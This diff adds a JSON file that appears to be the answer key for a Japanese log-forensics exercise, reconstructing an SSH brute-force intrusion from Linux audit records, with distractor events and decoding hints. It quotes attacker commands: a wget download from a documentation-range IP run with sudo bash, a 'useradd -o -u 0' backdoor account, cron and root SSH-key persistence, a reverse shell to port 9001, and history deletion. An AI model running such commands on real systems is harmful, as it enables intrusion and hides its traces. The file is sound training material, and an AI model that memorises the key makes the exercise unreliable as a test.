@@ -1,0 +1,108 @@
+{
+  "compromised": true,
+  "attacker_ip": "203.0.113.247",
+  "account": "report",
+  "account_uid": 1003,
+  "session_ses": 20,
+  "login_success": {
+    "time_jst": "2026-11-12 00:13:16",
+    "epoch": 1794409996.8,
+    "serial": 24437
+  },
+  "brute_force": {
+    "first": {
+      "time_jst": "2026-11-12 00:13:03",
+      "epoch": 1794409983.64,
+      "serial": 24416
+    },
+    "attempts_root": 5,
+    "attempts_backup": 1
+  },
+  "actions": [
+    {
+      "step": "偵察",
+      "detail": "id / uname -a / cat /etc/passwd"
+    },
+    {
+      "step": "ダウンロード",
+      "detail": "sudo wget -q http://198.51.100.40/upd.sh -O /tmp/.upd.sh",
+      "time_jst": "2026-11-12 00:13:45",
+      "epoch": 1794410025.499,
+      "serial": 24467
+    },
+    {
+      "step": "実行権限付与",
+      "detail": "sudo chmod +x /tmp/.upd.sh"
+    },
+    {
+      "step": "実行",
+      "detail": "sudo bash /tmp/.upd.sh",
+      "time_jst": "2026-11-12 00:13:52",
+      "epoch": 1794410032.027,
+      "serial": 24489
+    },
+    {
+      "step": "持続化：UID 0 の利用者追加",
+      "detail": "useradd -o -u 0 -g 0 ... svcmon（ADD_USER と /etc/passwd・/etc/shadow への書き込み）",
+      "time_jst": "2026-11-12 00:13:52",
+      "epoch": 1794410032.758,
+      "serial": 24504
+    },
+    {
+      "step": "持続化：cron",
+      "detail": "/etc/cron.d/svcmon を新規作成（key=cron）",
+      "time_jst": "2026-11-12 00:13:53",
+      "epoch": 1794410033.107,
+      "serial": 24518
+    },
+    {
+      "step": "持続化：SSH 鍵",
+      "detail": "/root/.ssh/authorized_keys に書き込み（key=rootkey）",
+      "time_jst": "2026-11-12 00:13:53",
+      "epoch": 1794410033.582,
+      "serial": 24519
+    },
+    {
+      "step": "外部への通信（リバースシェル）",
+      "detail": "connect → 198.51.100.40:9001（SOCKADDR）",
+      "time_jst": "2026-11-12 00:13:54",
+      "epoch": 1794410034.333,
+      "serial": 24521
+    },
+    {
+      "step": "痕跡の消去",
+      "detail": "/home/report/.bash_history を削除（key=delete）",
+      "time_jst": "2026-11-12 00:14:40",
+      "epoch": 1794410080.599,
+      "serial": 24524
+    },
+    {
+      "step": "ログアウト",
+      "time_jst": "2026-11-12 00:14:46",
+      "epoch": 1794410086.571,
+      "serial": 24526
+    }
+  ],
+  "c2": {
+    "ip": "198.51.100.40",
+    "port": 9001,
+    "saddr": "02002329C63364280000000000000000"
+  },
+  "persistence": [
+    "UID 0 の利用者 svcmon",
+    "/etc/cron.d/svcmon",
+    "/root/.ssh/authorized_keys"
+  ],
+  "backdoor_user": "svcmon",
+  "script": "upd.sh",
+  "distractors": [
+    "192.0.2.0/24 からの無効な利用者名での失敗ログイン（無差別な総当たり。侵入には至っていない）",
+    "deploy の sudo systemctl reload nginx（正規の運用）",
+    "tanaka の passwd（USER_CHAUTHTOK。自分のパスワード変更で正常）"
+  ],
+  "key_points": [
+    "sudo で root になっても auid=1003（report）のまま。誰の操作かは auid で追う",
+    "USER_CMD の cmd と PROCTITLE は16進数。解読するとコマンドがわかる",
+    "SOCKADDR の saddr: 0200=AF_INET、次の4桁がポート、次の8桁が IPv4 アドレス"
+  ]
+}
